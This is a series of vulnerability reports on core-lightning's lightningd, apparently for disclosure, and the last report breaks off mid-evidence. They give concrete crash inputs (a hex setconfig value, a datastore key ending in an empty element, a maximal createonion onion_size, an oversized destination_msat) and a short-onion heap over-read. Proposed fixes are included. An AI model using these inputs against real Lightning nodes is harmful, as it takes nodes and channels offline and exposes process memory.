# setconfig value accepted by plugin but rejected by check_literal exits lightningd

## Details
lightningd's `setconfig` RPC validates values for its own options with the option's cb_arg, but for plugin-registered dynamic options (lightningd/configs.c:801-805) it skips lightningd-side validation entirely and relies on the plugin's `setconfig` reply (lightningd/plugin.c:2264-2312). When the plugin accepts, setconfig_success() (configs.c:562-612) appends `name=value` to config.setconfig (or records a transient configvar), stores a configvar whose optarg is the caller's raw string (configs.c:322-339), and then renders the result with json_add_config(). For plugin options with a configvar, get_opt_val() returns that raw string (configs.c:78-79) and, because plugin "int" options carry OPT_SHOWINT (plugin.c:1123-1125), json_add_configval() runs check_literal() on it (configs.c:119). check_literal() treats anything outside `-0123456789.` as an invariant violation and calls errx(1) (configs.c:108), terminating the whole lightningd process.

The invariant does not hold. The shipped C plugin library parses int options with strtoul(..., 0) (plugins/libplugin.c:1617), so `0x10`, ` 10` and `+10` are accepted by every builtin dynamic int option — all eight `autoclean-*` options of the default-loaded, important autoclean plugin (plugins/autoclean.c:875-915), plus askrene-timeout/askrene-max-threads. The published pyln-client (`Plugin._set_config`, contrib/pyln-client/pyln/client/plugin.py:1042-1050) performs no type check at all, so a pyln dynamic int option accepts any string.

Attack: a rune bearer whose rune admits `setconfig` for such an option (e.g. `method=setconfig&pnameconfig=autoclean-cycle`) sends `setconfig autoclean-cycle 0x10` via commando (always on, every method forwarded after checkrune) or clnrest (plugins/rest-plugin/src/handlers.rs:275-279). The plugin accepts, the line `autoclean-cycle=0x10` is written to `<netdir>/config.setconfig`, and lightningd exits via errx(1) while formatting the response. On restart the line parses fine (plugin_opt_long_check uses opt_set_longval, also strtol base 0), so the node starts — but the next `listconfigs` call by any caller (operator's lightning-cli, dashboards, plugins) hits check_literal() again and kills the node. The condition persists until the operator hand-edits config.setconfig. With `transient=true` nothing is persisted but the immediate exit still occurs.

The project's own test (tests/test_plugin.py:3468-3476) only checks that `xxx` is rejected and `2` accepted; no test exercises a base-0 literal. The same sink is reachable from an operator-authored config line like `autoclean-cycle=0x10`, showing the two validators were never aligned.

Root cause: check_literal() enforces an output-format invariant with process termination on data that reaches it unvalidated through the plugin-option setconfig path, and lightningd's own notion of a valid integer (strto*l base 0) is wider than check_literal's.

## Evidence
1. [lightningd/configs.c:102–109](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/configs.c#L102-L109)
   check_literal() calls errx(1) — process exit — whenever a value for an OPT_SHOWINT/OPT_SHOWMSATS option is not 'true'/'false' or composed solely of the characters -0123456789. ; '0x10', ' 10' and '+10' all fail.
2. [lightningd/configs.c:795–808](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/configs.c#L795-L808)
   json_setconfig(): for a plugin option with OPT_HASARG it never runs ot->cb_arg (plugin_opt_long_check); the raw val string goes straight to plugin_set_dynamic_opt and the plugin's acceptance is the only validation.
3. [lightningd/configs.c:562–611](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/configs.c#L562-L611)
   setconfig_success(): appends name=value to config.setconfig (configvar_save) or records a transient configvar, then calls json_add_config() -> get_opt_val -> json_add_configval -> check_literal -> errx(1). The value is on disk before the exit.
4. [lightningd/configs.c:63–99](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/configs.c#L63-L99)
   get_opt_val(): plugin options have show=popt_show_default (non-NULL), so for a plugin option with a configvar it returns cv->optarg verbatim — the caller's raw string — rather than a canonical rendering.
5. [lightningd/configs.c:111–123](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/configs.c#L111-L123)
   json_add_configval() runs check_literal() on that raw string for every OPT_SHOWINT option before json_add_primitive.
6. [lightningd/plugin.c:2264–2312](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/plugin.c#L2264-L2312)
   plugin_setconfig_done(): on a plugin 'result' reply it calls psr->success (setconfig_success) with the unmodified vals; lightningd re-validates nothing.
7. [lightningd/plugin.c:1123–1149](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/plugin.c#L1123-L1149)
   Plugin "int" options are registered with cb_arg=plugin_opt_long_check and OPT_SHOWINT, show=popt_show_default — the combination that makes get_opt_val return cv->optarg and json_add_configval call check_literal.
8. [plugins/libplugin.c:1610–1625](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/plugins/libplugin.c#L1610-L1625)
   u64_option() parses with strtoul(arg,&endp,0): accepts hex (0x10), leading whitespace and a leading '+', all of which fail check_literal.
9. [plugins/libplugin.c:2223–2264](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/plugins/libplugin.c#L2223-L2264)
   libplugin's setconfig handler: if popt->handle (e.g. u64_option) returns NULL the plugin replies success; this reply is what lightningd trusts.
10. [plugins/autoclean.c:875–915](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/plugins/autoclean.c#L875-L915)
   Shipped, default-loaded important plugin autoclean registers eight dynamic "int" options validated by u64_option/cycle_seconds_option, so the path is reachable with no third-party code.
11. [lightningd/configs.c:322–338](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/configs.c#L322-L338)
   configvar_updated() records the new value via configvar_unparsed() only — optarg is the raw text after '=' with no parsing, trimming or canonicalisation.
12. [lightningd/configs.c:262–296](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/configs.c#L262-L296)
   json_listconfigs() walks every option through json_add_config(), so once the value is persisted in config.setconfig (which opt_set_longval base 0 accepts at restart) every later listconfigs call by any caller repeats the errx(1).

## Impact
Immediate termination of lightningd (all channels/HTLCs offline, important plugins and subdaemons die with it) and, in the non-transient case, a persisted config.setconfig line that makes any subsequent listconfigs terminate the node again until hand-edited. The config value itself is one the rune concedes the bearer may set, so no integrity gain beyond that; no confidentiality impact.

## Reproduction steps
1. Attacker holds a rune permitting setconfig on a shipped dynamic int option (autoclean-* are loaded by default and important). Over commando (default on) or clnrest they call setconfig with val "0x10" (or " 10"/"+10"). autoclean's u64_option accepts it; lightningd writes it to config.setconfig and then errx(1)s in check_literal while building the response. After restart, every listconfigs call repeats the exit until the operator edits the file. Single request, no race, no non-default configuration. The rune is a scoped credential (it can be bound to one option) rather than full administrative control, so PR:L.

## Recommended fix
1. check_literal() terminates the process (errx) on a formatting invariant that setconfig-supplied plugin values do not satisfy. Fix criteria: listconfigs/setconfig output must never terminate lightningd on an unexpected stored value: a value that is not a clean literal must be emitted as a string (or canonicalised) and logged. Verify: setconfig autoclean-cycle 0x10 followed by listconfigs returns normally.
2. lightningd skips its own validation (plugin_opt_long_check / canonical form) for plugin dynamic options and stores the caller's raw string. Fix criteria: Values written by setconfig for int/bool plugin options are validated and canonicalised by lightningd (decimal digits only) before being persisted or echoed, independent of the plugin's answer. Verify that `0x10`, ` 10`, `+10` and `abc` are rejected with a JSON-RPC error and nothing is written to config.setconfig.

# datastore key with empty trailing element is unreadable after creation; re-creating it aborts lightningd

## Details
The datastore stores a key array as a single blob joined with NUL separators (wallet/datastore.c db_bind_datastore_key, 33-52) and splits it back on NUL when reading (db_col_datastore_key, 83-106). The two are not inverses: a key whose last element is the empty string, e.g. ["a",""], is bound as the 2-byte blob "a\0", but the splitter consumes the trailing NUL as the terminator of the first part (partlen++ at line 96), sees len==0 and stops, yielding the 1-element key ["a"]. Any run of trailing empty elements loses one element the same way; interior empty elements round-trip. param_list_or_string (lightningd/datastore.c:61-90) accepts empty-string array elements, so RPC callers can supply such keys.

json_datastore (lightningd/datastore.c:139-153) decides whether a key already exists by calling wallet_datastore_first(key) and comparing the returned (split) key with datastore_key_eq. For ["a",""] the row "a\0" is the first row >= the start key, but its split form ["a"] fails datastore_key_startswith(k, startkey) (k2len 2 > k1len 1, wallet/datastore.c:16-17), so db_datastore_next frees the statement and returns NULL (108-125). json_datastore therefore sets prevdata = NULL (145-146), treats the key as absent, and in any create-capable mode (must-create [the default], create-or-replace, create-or-append) calls wallet_datastore_create (198), which executes INSERT INTO datastore VALUES (?, ?, 0) (wallet/wallet.c:6479-6488) with the identical blob "a\0". The table declares PRIMARY KEY (key) (wallet/migrations.c:795-801); sqlite3_step returns SQLITE_CONSTRAINT so db_sqlite3_exec returns false (db/db_sqlite3.c:296-301; the postgres driver likewise returns false on a non-COMMAND_OK result), and db_exec_prepared_v2 turns any failed statement into db_fatal (db/utils.c:198-201), which lightningd's errorfn routes to fatal_vfmt (wallet/db.c:91-101): lightningd exits, taking every `important` plugin with it. must-replace and must-append do not crash: they return DATASTORE_UPDATE_DOES_NOT_EXIST because the same missed lookup makes the key look absent.

Reproduction: `datastore key='["a",""]' string=x` succeeds (nothing matched, the row is inserted); the same call a second time (or any later create-mode write to that key, including after a restart, since the row persists) kills the node. The record is shown by listdatastore under the shorter key ["a"]; it can still be removed with `deldatastore key='["a",""]'` because json_deldatastore uses the exact-match wallet_datastore_get rather than the prefix scan.

Who can trigger it: any JSON-RPC caller permitted to call `datastore` - the operator and plugins (trusted) but also a commando or clnrest rune bearer whose rune allows `datastore`. The threat model makes the rune the intended bound on such a bearer; a rune may restrict the key with a pname condition, but lightningd/runes.c:914-916 evaluates pname conditions against the raw JSON text of the array token, so a prefix condition (e.g. pnamekey^["myapp") cannot exclude a trailing empty element appended inside the permitted prefix. The bearer thereby converts a bounded datastore-write permission into termination of lightningd.

The root cause is the lossy encoding of trailing empty key elements combined with an existence check that trusts the lossy round trip; the DB-level uniqueness failure is then promoted to a process abort.

## Evidence
1. [lightningd/datastore.c:139–199](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/datastore.c#L139-L199)
   Existence check uses wallet_datastore_first + datastore_key_eq on the split key; when the stored row splits to a shorter key the statement is NULL, prevdata is set NULL and (in must-create, create-or-replace or create-or-append mode) wallet_datastore_create is called for a key whose blob already exists.
2. [wallet/datastore.c:83–105](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/wallet/datastore.c#L83-L105)
   db_col_datastore_key: the trailing NUL of the last non-empty part is consumed as that part's terminator (partlen++), len becomes 0 and the loop exits, dropping a trailing empty element.
3. [wallet/datastore.c:33–51](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/wallet/datastore.c#L33-L51)
   db_bind_datastore_key joins parts with NUL; ["a",""] becomes the blob "a\0" which is distinct from "a" in the DB but splits back to ["a"].
4. [wallet/datastore.c:108–124](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/wallet/datastore.c#L108-L124)
   db_datastore_next stops and returns NULL when the first row's split key does not start with the requested key (k2len > k1len at 16-17), so the row with the identical blob is reported as non-existent.
5. [lightningd/datastore.c:61–89](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/datastore.c#L61-L89)
   param_list_or_string accepts any JSON string element, including the empty string, as a key part; nothing rejects empty elements before DB access.
6. [wallet/wallet.c:6479–6487](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/wallet/wallet.c#L6479-L6487)
   db_datastore_create does a plain INSERT with the joined key and db_exec_prepared_v2, which is fatal on constraint violation.
7. [wallet/migrations.c:795–800](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/wallet/migrations.c#L795-L800)
   datastore.key is the PRIMARY KEY, so the second INSERT of blob "a\0" violates uniqueness.
8. [db/utils.c:176–202](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/db/utils.c#L176-L202)
   db_exec_prepared_v2 calls db_fatal on any failed statement; wallet/db.c:91-101 routes the fatal errorfn to fatal_vfmt, terminating lightningd.
9. [lightningd/runes.c:914–916](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/runes.c#L914-L916)
   pname rune conditions are evaluated against the raw JSON text of the parameter token, so a prefix-restricted datastore rune cannot exclude a trailing empty element inside the permitted prefix; the rune is the only bound on a commando/clnrest bearer.

## Impact
lightningd exits via db_fatal, stopping all channel operations, HTLC handling and on-chain monitoring until restarted; important plugins die with it, and the attacker can repeat the crash on every restart while the rune remains valid. Integrity impact is limited to a datastore row that is listed under a different (shorter) key than the one it was written with and cannot be read or replaced through the prefix-scan paths; it remains deletable by exact key. No confidentiality impact.

## Reproduction steps
1. Attacker is any RPC caller allowed to invoke `datastore`: the operator and plugins are trusted, but a commando (always on, over the peer connection) or clnrest rune bearer whose rune permits `datastore` is bounded only by the rune, and pname conditions match the raw JSON text of the key array (runes.c:914-916), so a prefix-restricted rune cannot stop a trailing empty element. Two calls with key ["x",""] (or any key ending in an empty string) in a create-capable mode: the first inserts, the second deterministically hits the PRIMARY KEY violation and db_fatal. No race, no special configuration. The row persists, so the crash is repeatable after restart until the operator removes it with deldatastore using the exact key.

## Recommended fix
1. The NUL-joined key encoding loses trailing empty elements on decode, so the stored key and the requested key compare unequal even though their blobs are identical. Fix criteria: Encoding must round-trip exactly for every key array (including empty elements), or keys containing empty elements must be rejected at the RPC boundary (param_list_or_string) before any DB access. Verify: datastore with key ["a",""] either fails with an invalid-params error or, after creation, listdatastore shows the same key and a second datastore call returns DATASTORE_UPDATE_ALREADY_EXISTS rather than terminating the process.
2. json_datastore turns a uniqueness violation into a process abort because it relies on its own pre-check instead of handling the INSERT conflict. Fix criteria: A conflicting INSERT in the datastore path must surface as an RPC error (e.g. DATASTORE_UPDATE_ALREADY_EXISTS) rather than db_fatal; verify that forcing a duplicate key insert through the RPC produces an error response and the daemon keeps running.

# createonion onion_size is unbounded, forcing multi-gigabyte allocations and cipher work in lightningd

## Details
The `createonion` RPC (lightningd/pay.c json_createonion, 2420-2478) exposes the sphinx packet size as the optional `onion_size` parameter, parsed with param_number into a u32 with no upper bound (pay.c:2437), even though doc/schemas/createonion.json declares it a u16. The only check is that the hop payloads fit inside the requested size (pay.c:2455); create_onionpacket(cmd, sp, *packet_size, ...) (2460) is then called with the caller's value, and it runs before the command_check_only() test (2465), so `check createonion` triggers the same work.

create_onionpacket() (common/sphinx.c:526-612) allocates a routinginfo buffer of fixed_size bytes (550), fills every byte with a chacha20 stream (574), computes header padding with chacha20 streams positioned up to fixed_size, and for each hop memmove()s, XORs and HMACs the whole buffer (600-612). json_createonion then serialises the packet (another fixed_size + 66 bytes, sphinx.c:183) and hex-encodes it (2x, common/json_stream.c:315-326) into the JSON stream (a further copy). With onion_size = 4294967295 this is roughly 24 GiB of allocations plus tens of gigabytes of memmove/chacha20/HMAC work, all inside the single-threaded lightningd event loop. Either malloc fails and tal's default error handler abort()s the process (ccan/ccan/tal/tal.c:89; only cli/lightning-cli.c installs its own backend via tal_set_backend), the kernel OOM-kills lightningd (taking every channel daemon with it), or on a large host the daemon stalls for minutes while every peer connection, HTLC and subdaemon message waits. The cost is set by a single caller-chosen integer, so this is unbounded allocation triggered by specific input rather than volumetric load.

Attacker position: a rune bearer reaching lightningd over commando (peer custom messages; the request is far below commando's 1 MiB request limit) or clnrest HTTP, whose rune permits createonion (e.g. `method=createonion`, or a rune issued to a payment application). The rune model (doc/schemas/createrune.json) bounds a bearer by method and parameter restrictions; a rune allowing createonion concedes onion construction, not the ability to abort the node. Local RPC-socket users are fully trusted and are not the attacker here. The cln-rpc/cln-grpc bindings type onion_size as u16, so those clients cannot reach the harmful range; raw JSON callers can. The shipped pay/renepay/xpay/offers callers use fixed sizes (1300 or 32768). The request needs only one hop with a length-prefixed empty payload ('00'), which param_hops_array and sphinx_add_hop_has_length accept.

## Evidence
1. [lightningd/pay.c:2437–2460](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/pay.c#L2437-L2460)
   `onion_size` is parsed with param_number (any u32, default ROUTING_INFO_SIZE=1300) at 2437 although the schema declares it u16. The only check (2455) is that the hop payloads fit inside the requested size; create_onionpacket(cmd, sp, *packet_size, ...) at 2460 is then called with the caller's value, up to 4294967295, and it runs before the command_check_only() test at 2465, so `check createonion` triggers the same work. This is the fix site.
2. [common/sphinx.c:526–574](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/common/sphinx.c#L526-L574)
   create_onionpacket() allocates packet->routinginfo = tal_arr(packet, u8, fixed_size) (550) and fills all fixed_size bytes with a chacha20 stream via generate_cipher_stream (574); generate_header_padding then positions chacha20 streams at offsets up to fixed_size for each hop.
3. [common/sphinx.c:600–612](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/common/sphinx.c#L600-L612)
   For every hop the loop does memmove(routinginfo + shiftSize, routinginfo, fixed_size - shiftSize), an XOR of the whole fixed_size buffer and an HMAC over it, so CPU work is O(hops * onion_size) and every page of the buffer is touched.
4. [lightningd/pay.c:2468–2471](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/pay.c#L2468-L2471)
   serialize_onionpacket() allocates another onion_size + 66 bytes and json_add_hex() hex-encodes it (2x) and copies it again into the JSON stream, so peak memory is roughly 6x onion_size (about 24 GiB for the maximum value).
5. [common/sphinx.c:179–194](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/common/sphinx.c#L179-L194)
   serialize_onionpacket() sizes its output buffer as TOTAL_PACKET_SIZE(tal_bytelen(m->routinginfo)), i.e. the caller-chosen onion_size plus 66.
6. [common/json\_stream.c:315–326](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/common/json_stream.c#L315-L326)
   json_add_hex() allocates a hex string of 2*len bytes with tal_arr and json_add_string copies it into the response stream's membuf.
7. [ccan/ccan/tal/tal.c:89](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/ccan/ccan/tal/tal.c#L89)
   tal's default error function is abort(), and lightningd never replaces it (tal_set_backend is only called in cli/lightning-cli.c), so a failed malloc during this sequence aborts the lightningd process rather than returning an error.
8. [doc/schemas/createonion.json:56–60](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/doc/schemas/createonion.json#L56-L60)
   The published schema types onion_size as u16 (so cln-rpc/cln-grpc bindings cap it at 65535), documenting the intended bound that the C handler does not enforce for raw JSON-RPC callers (commando, clnrest, Unix socket).

## Impact
A single request can abort or OOM-kill lightningd (stopping all channel daemons, with HTLC timeout and on-chain consequences) or freeze its event loop for minutes, during which HTLCs, peer messages and other RPCs are not serviced. No confidentiality or integrity effect.

## Reproduction steps
1. Attacker holds a rune permitting createonion and reaches lightningd over commando (any connected peer, commando is always on) or clnrest. They send hops=[{pubkey: any, payload: '00'}], assocdata='00', onion_size=4294967295. The size check only ensures the payload fits; create_onionpacket allocates and fills gigabytes of buffers inside the event loop, and lightningd either aborts on malloc failure, is OOM-killed, or stalls for the duration. No race, no special state, repeatable; a low-privilege (rune-bound) caller is required.

## Recommended fix
json_createonion accepts an arbitrary u32 onion_size (the schema promises u16) and passes it to create_onionpacket, whose memory and CPU cost scale linearly with that value, before any check-only short-circuit. Fix criteria: createonion must reject onion_size values above a small fixed maximum (the protocol only uses 1300 and 32768; at most the schema's u16 range) with a JSON-RPC invalid-params error before any allocation, including on the `check` path; verify that onion_size=4294967295 returns an error immediately and lightningd's memory use is unchanged.

# injectpaymentonion destination_msat above onion amt_to_forward makes new_htlc_out fatal() lightningd

## Details
json_injectpaymentonion (lightningd/pay.c:1864-2148) decodes a caller-supplied onion with our own node key and, when the first payload is not final, offers an HTLC of payload->amt_to_forward on the channel the payload selects. The accounting value passed as final_msat is the caller's optional `destination_msat` (pay.c:2123-2127; it falls back to amt_to_forward only when it is 0). Nothing between parameter parsing (pay.c:1904) and send_htlc_out() checks destination_msat against amt_to_forward: the checks at pay.c:2022-2106 cover only channel existence/state, the htlc_minimum/maximum range of amt_to_forward and the cltv window. send_htlc_out() (peer_htlcs.c:785-791, in == NULL so am_origin is true) calls new_htlc_out() (htlc_end.c:306-317), which computes hout->fees = msat - final_msat for origin HTLCs and treats the underflow as corruption: corrupt("new_htlc_out", ...) (htlc_end.c:78-90) calls fatal(), which aborts (or exit(1)s) lightningd and with it every subdaemon.

Attack: a caller permitted to invoke `injectpaymentonion` — a rune whose method restriction allows it, presented over commando (any connected peer; commando is always on) or clnrest — builds a one-hop non-final onion for our own node id (createonion or offline from our public key) whose payload carries amt_to_forward = A within the chosen channel's htlc_minimum/maximum, an outgoing_cltv_value, and the short_channel_id of one of our HTLC-capable channels (or a blinded forward naming a peer). They call injectpaymentonion with that onion, a fresh payment_hash, partid != 0, groupid, cltv_expiry in (height, height + max_htlc_cltv], and destination_msat = A + 1 (or any larger value). check_progress passes (no prior payment), the onion decodes, channel/range/cltv checks pass, and send_htlc_out -> new_htlc_out -> fatal() kills the node before register_payment_and_waiter writes any payment row, so the attack is repeatable after each restart.

The shipped xpay (plugins/xpay/xpay.c:1529-1538: amount_msat = hops[0].amount_in, destination_msat = hops[len-1].amount_out with unsigned fees added per hop) and renepay (plugins/renepay/routetracker.c:490-495: amount_sent vs amount_deliver) always pass destination_msat <= the onion's first-hop amount, so a payee cannot reach this through the pay/xpay/renepay methods; the attacker must hold a rune that names injectpaymentonion itself. Such a rune bounds what the bearer may spend (and can further bound amount_msat), not whether they may terminate the node, so the crash is a gain beyond the rune's grant. The same sink is reached from sendpay/sendonion via a distinct entry point and parameter (filed separately); this record covers injectpaymentonion's `destination_msat`.

## Evidence
1. [lightningd/pay.c:2123–2136](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/pay.c#L2123-L2136)
   The forwarding branch calls send_htlc_out(next, payload->amt_to_forward, *cltv, final_msat = (*destination_msat == 0 ? payload->amt_to_forward : *destination_msat), ...). The HTLC amount comes from the attacker-built onion and final_msat from the attacker's `destination_msat` parameter; the two are never ordered.
2. [lightningd/pay.c:1893–1906](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/pay.c#L1893-L1906)
   `destination_msat` is an optional param_msat with no relation checked against the onion; `onion`, `amount_msat`, `cltv_expiry`, `partid`, `groupid` are all caller-supplied.
3. [lightningd/pay.c:2022–2106](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/pay.c#L2022-L2106)
   The only checks between decode and send_htlc_out are channel lookup/state (forward_channel scid or forward_node_id peer), htlc_minimum/maximum range on amt_to_forward, and cltv within (height, height+max_htlc_cltv]; none involve destination_msat.
4. [lightningd/pay.c:1938–1971](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/pay.c#L1938-L1971)
   The onion is parsed and decoded with our own node key (ecdh_maybe_blinding/process_onionpacket/onion_decode), so anyone who knows our public node id can construct a valid non-final first-hop payload (amt_to_forward, outgoing_cltv_value, short_channel_id) offline or with createonion.
5. [lightningd/peer\_htlcs.c:785–790](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/peer_htlcs.c#L785-L790)
   send_htlc_out() reaches new_htlc_out(..., am_origin = true, final_msat, ...) once the channel is HTLC-capable and owned by channeld.
6. [lightningd/htlc\_end.c:311–317](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/htlc_end.c#L311-L317)
   For am_origin HTLCs (in == NULL) amount_msat_sub(&hout->fees, msat, final_msat) fails when final_msat > msat and new_htlc_out returns corrupt("new_htlc_out", ...) with a non-NULL abortstr.
7. [lightningd/htlc\_end.c:78–89](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/htlc_end.c#L78-L89)
   corrupt() with a non-NULL abortstr calls fatal(), terminating lightningd.

## Impact
fatal() terminates lightningd and all channel daemons; the node is unavailable until restarted and in-flight HTLCs cannot be resolved meanwhile. No confidentiality or integrity impact.

## Reproduction steps
1. Attacker is an RPC caller allowed to use injectpaymentonion directly: a bearer of a rune whose method restriction admits it, reaching lightningd through commando (any connected Lightning peer, commando always enabled) or clnrest. They craft a non-final onion addressed to our node (public key), naming one of our live channels, and pass destination_msat larger than the payload's amt_to_forward. All of injectpaymentonion's own checks pass (pay.c:2022-2106), send_htlc_out calls new_htlc_out, the fee subtraction underflows and fatal() fires. Default configuration; no payment row is written, so it repeats after every restart. Not reachable by a payee through the shipped pay/xpay/renepay plugins, which always pass destination_msat <= the first-hop amount.

## Recommended fix
1. json_injectpaymentonion accepts a destination_msat larger than the onion's amt_to_forward and passes the pair to send_htlc_out() without ordering them. Fix criteria: injectpaymentonion must reject requests where destination_msat is non-zero and greater than payload->amt_to_forward with a JSON-RPC error before offering any HTLC; verify such a request fails cleanly and lightningd keeps running.
2. new_htlc_out() enforces msat >= final_msat for origin HTLCs via corrupt()->fatal() although both values originate from the RPC caller. Fix criteria: For am_origin HTLCs the invariant violation must produce a returned failure (local failmsg) rather than process termination.

# sendonion accepts any onion length; new_htlc_out over-reads heap into HTLC sent to peer

## Details
The `sendonion` RPC (lightningd/pay.c json_sendonion, line 1374) hands the caller-supplied `onion` hex blob to parse_onionpacket(onion, tal_bytelen(onion)) without checking that it is TOTAL_PACKET_SIZE(ROUTING_INFO_SIZE) = 1366 bytes, although the RPC schema documents it as a "1366 bytes long blob" and the sibling injectpaymentonion enforces exactly that (pay.c:1932-1936). parse_onionpacket (common/sphinx.c:196-230) accepts any buffer of at least 66 bytes starting with version 0x00 and a valid compressed pubkey: routinginfo = fromwire_tal_arrn(max - HMAC_SIZE) returns NULL for num == 0 (wire/fromwire.c:243), the 32-byte HMAC is read, and the packet is returned. send_onion() (pay.c:775-796) then calls serialize_onionpacket(), which allocates TOTAL_PACKET_SIZE(tal_bytelen(routinginfo)) = 66 bytes on tmpctx, and passes that pointer to send_htlc_out().

Every consumer assumes 1366 bytes: new_htlc_out() (htlc_end.c:289-290) memcpy()s sizeof(hout->onion_routing_packet) == 1366 bytes into the htlc_out, and towire_channeld_offer_htlc() (peer_htlcs.c:808; channeld_wire.csv:101 `u8 onion_routing_packet[1366]`, generated as towire_u8_array(&p, onion_routing_packet, 1366)) copies another 1366 bytes into the message for channeld. With a 66-byte onion each copy reads 1300 bytes past the end of the 66-byte tmpctx allocation into adjacent heap. channeld (channeld.c:6578, 6622) decodes the fixed array and, once channel_add_htlc accepts the amount, writes it verbatim into update_add_htlc to the first-hop peer; lightningd also persists hout->onion_routing_packet to channel_htlcs once the HTLC is committed (wallet.c:3495).

Attack: a caller permitted to invoke `sendonion` — a rune bearer over commando (a default `important` plugin, always on, rune-checked against the peer id) or clnrest — supplies onion = 00 || <any valid compressed pubkey> || <32 filler bytes>, any payment_hash, and first_hop = {id: <a peer node the attacker runs>, channel: <that channel's scid or 0 for any>, amount_msat: small, delay: N}. The attacker's node opens an inbound channel to the victim with push_msat (or pays it first) so the victim has outbound balance; find_channel_for_htlc_add (pay.c:852) selects that channel and send_htlc_out offers the HTLC. The attacker's peer receives 1300 bytes of lightningd heap inside update_add_htlc and simply fails the HTLC. The call is repeatable at will, giving a heap-disclosure oracle over the long-lived lightningd process, whose heap holds the rune master secret (lightningd/runes.c:175, from which unrestricted runes can be forged), payment preimages and path secrets, invoice data and other callers' JSON-RPC buffers; an over-read that crosses into an unmapped page would crash lightningd.

The shipped pay/xpay/renepay plugins always pass createonion's 1366-byte output, so only a direct RPC caller reaches this; a rune that merely permits `sendonion` grants the right to offer HTLCs, not to read process memory.

## Evidence
1. [lightningd/pay.c:1374–1380](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/pay.c#L1374-L1380)
   json_sendonion hands the RPC-supplied `onion` bytes to parse_onionpacket() with their actual length and never checks that the length is TOTAL_PACKET_SIZE(ROUTING_INFO_SIZE) (1366). Contrast json_injectpaymentonion at 1932-1936, which enforces exactly that before parsing. This is the fix site.
2. [common/sphinx.c:196–230](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/common/sphinx.c#L196-L230)
   parse_onionpacket() accepts any srclen >= 66: version byte 0, a valid 33-byte pubkey, then routinginfo = fromwire_tal_arrn(max - HMAC_SIZE) (NULL when exactly 0 bytes remain, wire/fromwire.c:243) and a 32-byte hmac. Nothing compares srclen to the 1366-byte wire size despite the header comment saying srclen must be TOTAL_PACKET_SIZE, so a 66-byte input yields a packet whose routinginfo has length 0.
3. [lightningd/pay.c:775–795](https://github.com/Halbarevi/core-lightning/blob/6f25f6969ea7d76c1aa4652b4c3d8316b4a0bee8/lightningd/pay.c#L775-L795)
